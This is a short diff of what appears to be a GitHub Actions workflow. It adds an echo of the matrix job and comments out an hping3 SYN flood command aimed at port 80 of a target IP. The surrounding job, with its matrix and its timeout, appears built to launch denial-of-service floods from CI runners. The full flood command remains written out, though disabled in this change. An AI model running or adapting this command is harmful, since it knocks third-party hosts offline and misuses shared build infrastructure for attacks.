@@ -69,5 +69,6 @@ jobs:
         timeout-minutes: 2
         run: |
           echo $IP
+          echo ${{ matrix.job }}
           # ping $IP
-          sudo hping3 -S --flood -V -d 1400 -p 80 -s 1000-65535 $IP
+          # sudo hping3 -S --flood -V -d 1400 -p 80 -s 1000-65535 $IP
